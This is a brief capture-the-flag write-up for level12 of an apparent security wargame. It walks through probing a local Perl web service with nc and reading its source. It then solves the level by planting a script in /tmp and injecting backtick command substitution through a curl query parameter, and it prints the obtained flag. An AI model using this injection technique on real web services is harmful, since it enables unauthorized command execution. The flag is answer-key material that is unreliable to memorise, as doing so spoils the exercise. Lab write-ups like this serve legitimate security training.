# level12

we got some intel from level00

```shell
dr-xr-x---  2 flag12 level12  33 Mar 12  2016 level12

/var/www/level12

/rofs/var/www/level12
```

1. examinate existing files permissions

```shell
ls -la
```

shows a perl script that is supposed to run on localhost:4646

2. look for the file we previously saw

```shell
cat /var/www/level12/level12.pl
```

shows the same script, as flag12:level12

3. try to connect to it with netcat

```shell
nc localhost 4646
```

waits for an input, and replies `..` as expected when given a random input

4. create a custom file with an uppercase name to trick regex to match

```shell
echo "getflag | wall" > /tmp/PWN
```

5. inject some code to get the flag

```shell
curl 'localhost:4646?x=`/*/PWN`'
```

gives flag: `g1qKMiRpXf53AWhDaU7FEkczr`
